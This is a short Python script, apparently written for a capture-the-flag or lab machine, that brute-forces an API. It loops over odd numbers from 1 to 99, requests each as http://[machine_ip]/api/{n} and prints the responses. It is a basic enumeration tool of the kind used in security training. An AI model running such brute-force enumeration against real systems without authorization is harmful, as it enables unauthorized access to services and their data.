#!/usr/bin/env python3

#   ___  ______ _________________ _   _ _____ ___________ 
#  / _ \ | ___ \_   _| ___ \ ___ \ | | |_   _|  ___| ___ \
# / /_\ \| |_/ / | | | |_/ / |_/ / | | | | | | |__ | |_/ /
# |  _  ||  __/  | | | ___ \    /| | | | | | |  __||    / 
# | | | || |    _| |_| |_/ / |\ \| |_| | | | | |___| |\ \ 
# \_| |_/\_|    \___/\____/\_| \_|\___/  \_/ \____/\_| \_|
#                                                      
# Author: github.com/officialjm
#
# This is a small python script that will use numerical bruteforce in order to find the 
# correct API response on the target domain (Is in a range of 1 - 100).

import requests

for api_key in range(1,100,2): # Set API "key" range
    print(f"api_key {api_key}")
    html = requests.get(f'http://[machine_ip]:80/api/{api_key}') # Insert machine ip here.
    print(html.text)
